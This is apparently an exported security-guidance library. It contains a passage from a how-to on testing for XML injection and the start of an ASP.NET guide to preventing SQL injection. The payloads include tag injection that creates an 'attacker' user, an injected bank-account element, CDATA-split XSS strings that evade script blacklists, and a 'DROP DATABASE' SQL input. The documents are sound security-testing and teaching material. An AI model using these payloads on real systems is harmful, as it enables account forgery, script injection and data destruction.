&lt;p&gt;'&amp;quot;&amp;gt;&amp;lt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;gt;'&amp;quot;&amp;lt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;&amp;gt;'&amp;quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (combined)&lt;/p&gt;
&lt;p&gt;Then, observe how the XML-based server responds.&amp;nbsp; The idea is to modify a valid XML tag such as the first string below, to the second one.&amp;nbsp; Here, set the
&lt;strong&gt;$input&lt;/strong&gt; variable to a single quote ('):&lt;/p&gt;
&lt;pre&gt;&lt;strong&gt;&amp;lt;node attrib='$input'/&amp;gt;&lt;/strong&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;strong&gt;&lt;/strong&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;strong&gt;&amp;lt;node attrib='''/&amp;gt;&lt;/strong&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;strong&gt;&lt;/strong&gt;&lt;/pre&gt;
&lt;p&gt;Because the &lt;em&gt;node&lt;/em&gt; element will now have the &lt;em&gt;attrib&lt;/em&gt; attribute set to
&lt;strong&gt;''' (&lt;/strong&gt;note the extra single quote), it will result in invalid XML.&amp;nbsp; An invalid XML message from the server is a good indication that there are potential XML injection bugs present in the server application.&lt;/p&gt;
&lt;pre&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Comment strings&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Another way to generate invalid XML is to add the start of an XML comment:&amp;nbsp;&lt;/p&gt;
&lt;p&gt;xyz&amp;lt;!--&lt;/p&gt;
&lt;p&gt;Let’s say that you entered the string above as the &lt;em&gt;username&lt;/em&gt;.&amp;nbsp; The resulting XML will now look like this and will end up being invalid:&lt;/p&gt;
&lt;pre&gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;user&amp;gt; &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;username&amp;gt;xyz&amp;lt;!--&amp;lt;/username&amp;gt; &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;password&amp;gt;qwerty&amp;lt;/password&amp;gt; &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;userid&amp;gt;111&amp;lt;userid/&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;mail&amp;gt;JohnyC@examplesite.com&amp;lt;/mail&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;/user&amp;gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Ampersand (&amp;amp;)&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;XML uses the ampersand character to refer to another entity in its user-defined XML schema.&amp;nbsp; For example, if the user passes the following string as the
&lt;em&gt;username,&lt;/em&gt; it will result in the corresponding XML:&lt;/p&gt;
&lt;pre&gt;&amp;amp;amp;xyz&lt;/pre&gt;
&lt;p&gt;Results in:&lt;/p&gt;
&lt;pre&gt;&amp;lt;user&amp;gt; &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;username&amp;gt;&amp;amp;xyz&amp;lt;/username&amp;gt; &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;password&amp;gt;qwerty&amp;lt;/password&amp;gt; &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;userid&amp;gt;111&amp;lt;userid/&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;mail&amp;gt;JohnyC@examplesite.com&amp;lt;/mail&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;/user&amp;gt;&amp;nbsp;&lt;/pre&gt;
&lt;p&gt;This will attempt to refer to the &lt;strong&gt;&amp;amp;xyz&lt;/strong&gt; entity of the XML document.&amp;nbsp;&amp;nbsp; If the document doesn’t contain this entity, then the newly built tag above will result in an invalid XML document.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;&amp;nbsp;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Learn from error messages to conduct a real attack&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;The purpose of creating invalid XML documents is so that you can start gaining information about the underlying XML format based on error messages they generate.&amp;nbsp; Let’s say you inserted the following fuzz string (‘) in an input field and the server responded
 with the following error message:&lt;/p&gt;
&lt;pre&gt;Invalid XML:&amp;nbsp;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;user name='''/&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;id ='1232'/&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;realname='tester'&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;password='ind3$truct'/&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;user&amp;gt;&lt;/pre&gt;
&lt;p&gt;Now, consider how you can utilize this information to create an additional, valid user while conserving the structure and format of the original XML document:&lt;/p&gt;
&lt;pre&gt;&lt;strong&gt;$input = attacker'&amp;gt;&amp;lt;id ='1234'/&amp;gt;&amp;lt;realname='hacker'&amp;gt;&amp;lt;password='qwerty'/&amp;gt;&amp;lt;/user&amp;gt;&lt;/strong&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;strong&gt;&amp;lt;user name ='real_user&lt;/strong&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;results in the server creating an extra element:&lt;/p&gt;
&lt;pre&gt;&amp;lt;user name='attacker'/&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;id ='1234'/&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;realname='hacker'&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;password='ind3$truct'/&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;/user&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;user name='real_user'/&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;id ='1232'/&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;realname='tester'&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;password='ind3$truct'/&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;/user&amp;gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Try to exploit CDATA tags with Cross-Site Scripting (XSS) attacks&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;To finish this step try to exploit the contents of CDATA tags to see if you can execute an XSS attack.&amp;nbsp; This test is quite straight forward, simply remember that the XML parser extracts all data enclosed in between the tags
&lt;strong&gt;&amp;quot;&amp;lt;![CDATA[&amp;quot; &lt;/strong&gt;and &lt;strong&gt;&amp;quot;]]&amp;gt;&amp;quot; &lt;/strong&gt;to form a new string.&amp;nbsp; For example:&lt;/p&gt;
&lt;pre&gt;&amp;lt;![CDATA[xyz]]&amp;gt;&lt;/pre&gt;
&lt;p&gt;Becomes:&lt;/p&gt;
&lt;pre&gt;xyz&lt;/pre&gt;
&lt;p&gt;In the same manner:&lt;/p&gt;
&lt;pre&gt;&amp;lt;![CDATA[&amp;lt;]]&amp;gt;script&amp;lt;![CDATA[&amp;gt;]]&amp;gt;&lt;/pre&gt;
&lt;p&gt;Becomes:&lt;/p&gt;
&lt;pre&gt;&amp;lt;script&amp;gt;&lt;/pre&gt;
&lt;p&gt;Finally:&lt;/p&gt;
&lt;pre&gt;&amp;lt;![CDATA[&amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;]]&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;/pre&gt;
&lt;p&gt;Becomes:&lt;/p&gt;
&lt;pre&gt;&amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&lt;/pre&gt;
&lt;h1&gt;Step 4:&amp;nbsp; Tune Test Cases&lt;/h1&gt;
&lt;p&gt;During this step you must focus in modifying your test case data to cover all entry points based on the format of each specific entry point.&amp;nbsp; In addition, you must tune your test case data in order to execute additional XML Injection payloads.
&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Consider string format and encoding according to entry point&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Web Forms&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;/em&gt;&lt;/strong&gt;Web forms are the easiest to test since they commonly allow most ASCII strings.&amp;nbsp; An attacker can try entering this string into an input field, for instance in the web form below:&lt;/p&gt;
&lt;p&gt;&lt;img src=""&gt;&lt;/p&gt;
&lt;p&gt;An attacker might try to enter this string in the email text field to execute an XML injection attack:&lt;/p&gt;
&lt;pre&gt;JohnyC@examplesite.com&amp;lt;/mail&amp;gt;&amp;lt;account type=&amp;quot;savings&amp;quot;&amp;gt;&amp;lt;created&amp;gt;03-02-2008&amp;lt;/created&amp;gt;&amp;lt;number&amp;gt;12345678&amp;lt;/number&amp;gt;&amp;lt;balance&amp;gt;1000000&amp;lt;/balance&amp;gt;&amp;lt;/account&amp;gt;&lt;/pre&gt;
&lt;p&gt;It’s possible that client side checks are in place to match the contents of this text field with a valid email format.&amp;nbsp; However, client side checks are easily bypassed by removing them at the attacker’s end.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;URL Contents&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;/em&gt;&lt;/strong&gt;&lt;br&gt;
The format of URLs tends to be more complex than that of other input fields.&amp;nbsp; This is due to the need for URLs to contain special or reserved characters, such as spaces, questions marks, single quotes, less than/greater than (&amp;lt;/&amp;gt;) symbols, and ampersands as
 data, rather than URL directives.&amp;nbsp; The client &lt;em&gt;encodes&lt;/em&gt; the URL and then sends it to the server, which decodes it so that the special characters can be processed as data.&lt;/p&gt;
&lt;p&gt;How the encoding and decoding is done depends on the programming language in use.&amp;nbsp; For example, sometimes the encoding function replaces the blank spaces with a plus (&amp;#43;) sign, or the characters %20, so that:&lt;/p&gt;
&lt;pre&gt;Joseph Cohen&lt;/pre&gt;
&lt;p&gt;Becomes:&lt;/p&gt;
&lt;pre&gt;Joseph&amp;#43;Cohen&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/pre&gt;
&lt;p&gt;or&lt;strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;Joseph%20Cohen&lt;/pre&gt;
&lt;p&gt;The most common URL encoding scheme consists of replacing special and reserved characters with a percent sign and then their hexadecimal values (e.g.
&lt;strong&gt;%HH&lt;/strong&gt;.)&amp;nbsp; Using this encoding scheme the URL seen below will be translated from:&lt;/p&gt;
&lt;pre&gt;&lt;strong&gt;http://www.examplesite.com/CreateChecking.php?username=JohnyC&amp;amp;password=qwerty&amp;amp;email=JohnyC@examplesite.com&amp;lt;/mail&amp;gt;&amp;lt;account type=&amp;quot;savings&amp;quot;&amp;gt;&amp;lt;created&amp;gt;03-02-2008&amp;lt;/created&amp;gt;&amp;lt;number&amp;gt;12345678&amp;lt;/number&amp;gt;&amp;lt;balance&amp;gt;1000000&amp;lt;/balance&amp;gt;&amp;lt;/account&amp;gt;&lt;/strong&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;strong&gt;&lt;/strong&gt;&lt;/pre&gt;
&lt;pre&gt;to: &amp;nbsp;&lt;/pre&gt;
&lt;pre&gt;&lt;strong&gt;http://www.examplesite.com/CreateChecking.php?username=JohnyC&amp;amp;password=qwerty&amp;amp;email=JohnyC%40examplesite.com%3c%2fmail%3e%3caccount%20type%3d%22savings%22%3e%3ccreated%3e03-02-2008%3c%2fcreated%3e%3cnumber%3e12345678%3c %2fnumber%3e%3cbalance%3e1000000%3c%2fbalance%3e%3c%2faccount%3e&lt;/strong&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;strong&gt;&lt;/strong&gt;&lt;/pre&gt;
&lt;p&gt;This is because the below characters translate to their hex encoding like this:&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;div&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;space&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;@&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;&amp;lt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;/&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&amp;gt;&amp;nbsp;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;=&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;&amp;quot;&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;%20&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;%40&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;%3c&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;%2f&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;%3e&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;%3d&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;%22&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Flash Parameters&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Flash uses the &lt;strong&gt;FlashVars &lt;/strong&gt;parameter tag from HTML embedded objects to collect user input:&lt;strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&amp;lt;object classid=&amp;quot;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000&amp;quot;&lt;/pre&gt;
&lt;pre&gt; codebase=&amp;quot;&amp;quot;http://macromedia.com/cabs/swflash.cab#version=6,0,0,0&amp;quot;&amp;quot;&lt;/pre&gt;
&lt;pre&gt; width=&amp;quot;250&amp;quot; height=&amp;quot;250&amp;quot; id=&amp;quot;flaMovie1&amp;quot; align=&amp;quot;center&amp;quot;&amp;gt;&lt;/pre&gt;
&lt;pre&gt; &amp;lt;param name=movie value=&amp;quot;flaMovie1.swf&amp;quot;&amp;gt;&lt;/pre&gt;
&lt;pre&gt; &amp;lt;param name=FlashVars value=&amp;quot;input=userInput&amp;quot;&amp;gt; &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;lt;param name=quality value=high&amp;gt; &lt;/pre&gt;
&lt;pre&gt;&amp;lt;/object&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/pre&gt;
&lt;p&gt;When testing through &lt;strong&gt;FlashVars &lt;/strong&gt;you need to replace the &lt;strong&gt;
userInput &lt;/strong&gt;value with the XML injection string.&amp;nbsp; &lt;/p&gt;
&lt;p&gt;Note: Make sure that you also try different encodings when you test through this entry point.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;&amp;nbsp;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;XML store contents&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;You must also tune your test case data when modifying the CDATA tag within XML files to execute a successful XSS attack.&amp;nbsp; For instance, some applications may blacklist any input that contains the following string, thus not allowing it to be placed in the
 XML data store:&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&amp;lt;script&amp;gt; &lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;Here you may need to tweak your attack data to hide the script tags by adding extra CDATA tags&lt;strong&gt;&lt;em&gt;:&amp;nbsp;&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;&amp;nbsp;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&amp;lt;data&amp;gt;&amp;lt;[CDATA[&amp;lt;sc]]&amp;gt;&amp;lt;![CDATA[ript&amp;gt;alert('XSS')&amp;lt;/sc]]&amp;gt;&amp;lt;![CDATA[ript&amp;gt;]]&amp;gt;&amp;lt;/data&amp;gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;At the end the contents within the CDATA tags get concatenated to construct a valid &amp;lt;script&amp;gt; tag.&amp;nbsp; This will bypass any checks done for
&lt;strong&gt;&amp;lt;script&amp;gt;&lt;/strong&gt; before the final concatenation.&lt;strong&gt;&lt;em&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;/em&gt;&lt;/strong&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Additional entry points&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;&amp;nbsp;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Each application will have different ways of processing input from users, files, services, and other software entities.&amp;nbsp; Ensure that you understand the format of each entry point and cover the different formats on each entry point for each high risk component.&lt;strong&gt;&lt;em&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;&amp;nbsp;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Try additional payloads&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;So far you’ve learned how to execute two payloads:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Tag injection. &lt;/li&gt;&lt;li&gt;Cross-site scripting through CDATA tags.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;There are other payloads that you can try such as:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Denial of service by consuming extra memory with excessive tags. &lt;/li&gt;&lt;li&gt;Denial of service by resource exhaustion via recursive elements. &lt;/li&gt;&lt;li&gt;Information disclosure attacks using XML External Entities (XEE)&lt;a href="about:blank#_edn4" name="x__ednref4"&gt;[iv]&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;Each payload will require special tweaking of the XML attack data and might add new entry points to the scenario.&amp;nbsp; However, it is imperative that you keep up to date with the latest attack techniques related to XML injection and include them in your security
 test suite.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Conclusions&lt;/h1&gt;
&lt;p&gt;Testing for XML injection requires that you understand how the application under test uses XML.&amp;nbsp; There are different scenarios ranging from when systems take XML as input, to when systems respond with XML as HTML output.&amp;nbsp; To successfully test for XML injection
 you need to understand these different scenarios.&amp;nbsp; Then, familiarize yourself with any potentially dangerous code and characteristics of any high risk components that are present.&amp;nbsp; Create a test plan that matches high risk components with their different entry
 points.&amp;nbsp; Then, start testing with simple test strings and observe how the application responds.&amp;nbsp; Finally, to achieve the most complete coverage, ensure that you tune your attack data to cover all formats in all entry points, and try different, up to date payloads.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;div&gt;&lt;br&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;hr&gt;
&lt;/div&gt;
&lt;p&gt;&lt;a href="about:blank#_ednref1" name="x__edn1"&gt;[i]&lt;/a&gt;Programming Web Services with SOAP.&amp;nbsp; James Snell, Doug Tidwell &amp;amp; Pavel Kulchenko.&amp;nbsp;
&lt;a href="http://www.topxml.com/soap/articles/webservices/default.asp"&gt;http://www.topxml.com/soap/articles/webservices/default.asp&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="about:blank#_ednref2" name="x__edn2"&gt;[ii]&lt;/a&gt; XML Web Services Basics.&amp;nbsp; Roger Wolter.&amp;nbsp; Microsoft Corporation.&amp;nbsp;
&lt;a href="http://msdn2.microsoft.com/en-us/library/ms996507.aspx"&gt;http://msdn2.microsoft.com/en-us/library/ms996507.aspx&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="about:blank#_ednref3" name="x__edn3"&gt;[iii]&lt;/a&gt; Document Type Definition.&amp;nbsp; Wikipedia.&amp;nbsp;
&lt;a href="http://en.wikipedia.org/wiki/Document_Type_Definition"&gt;http://en.wikipedia.org/wiki/Document_Type_Definition&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="about:blank#_ednref4" name="x__edn4"&gt;[iv]&lt;/a&gt; Testing for XML Injection. OWASP.
&lt;a href="http://www.owasp.org/index.php/Testing_for_XML_Injection"&gt;http://www.owasp.org/index.php/Testing_for_XML_Injection&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>d1220cc3-7aef-472d-92de-182218c05c93</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>How to Protect From SQL Injection in ASP.NET</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>How To</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Summary&lt;/h1&gt;
&lt;p&gt;This How to shows a number of ways to help protect your ASP.NET application from SQL injection attacks. SQL injection can occur when an application uses input to construct dynamic SQL statements or when it uses stored procedures to connect to the database.
 Conventional security measures, such as the use of SSL and IPSec, do not protect your application from SQL injection attacks. Successful SQL injection attacks enable malicious users to execute commands in an application's database.&lt;/p&gt;
&lt;p&gt;Countermeasures include using a list of acceptable characters to constrain input, using parameterized SQL for data access, and using a least privileged account that has restricted permissions in the database. Using stored procedures with parameterized SQL
 is the recommended approach because SQL parameters are type safe. Type-safe SQL parameters can also be used with dynamic SQL. In situations where parameterized SQL cannot be used, consider using character escaping techniques.
&lt;/p&gt;
&lt;h1&gt;Contents&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Objectives&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Overview&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Summary of Steps&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Step 1. Constrain Input&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Step 2. Use Parameters with Stored Procedures&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Step 3. Use Parameters with Dynamic SQL&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Additional Considerations&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Additional Resources&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Objectives&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Learn how SQL injection attacks work. &lt;/li&gt;&lt;li&gt;Constrain input to prevent SQL injection. &lt;/li&gt;&lt;li&gt;Use type safe SQL command parameters to prevent SQL injection. &lt;/li&gt;&lt;li&gt;Use a least privileged account to connect to the database. &lt;/li&gt;&lt;li&gt;Learn additional countermeasures to further reduce risk. &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Overview&lt;/h1&gt;
&lt;p&gt;A successful SQL injection attack enables a malicious user to execute commands in your application's database by using the privileges granted to your application's login. The problem is more severe if your application uses an over-privileged account to connect
 to the database. For example, if your application's login has privileges to eliminate a database, then without adequate safeguards, an attacker might be able to perform this operation.&lt;/p&gt;
&lt;p&gt;Common vulnerabilities that make your data access code susceptible to SQL injection attacks include:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Weak input validation. &lt;/li&gt;&lt;li&gt;Dynamic construction of SQL statements without the use of type-safe parameters.
&lt;/li&gt;&lt;li&gt;Use of over-privileged database logins. &lt;/li&gt;&lt;/ul&gt;
&lt;h2&gt;SQL Injection Example&lt;/h2&gt;
&lt;p&gt;Consider what happens when a user types the following string in the &lt;strong&gt;SSN&lt;/strong&gt; text box, which is expecting a Social Security number of the form
&lt;em&gt;nnn-nn-nnnn&lt;/em&gt;.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;' ; DROP DATABASE pubs  --  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Using the input, the application executes the following dynamic SQL statement or stored procedure, which internally executes a similar SQL statement.
&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;// Use dynamic SQL&lt;br&gt;SqlDataAdapter myCommand = new SqlDataAdapter(&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;quot;SELECT au_lname, au_fname FROM authors WHERE au_id = '&amp;quot; &amp;#43; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; SSN.Text &amp;#43; &amp;quot;'&amp;quot;, myConnection);&lt;/pre&gt;
&lt;/div&gt;
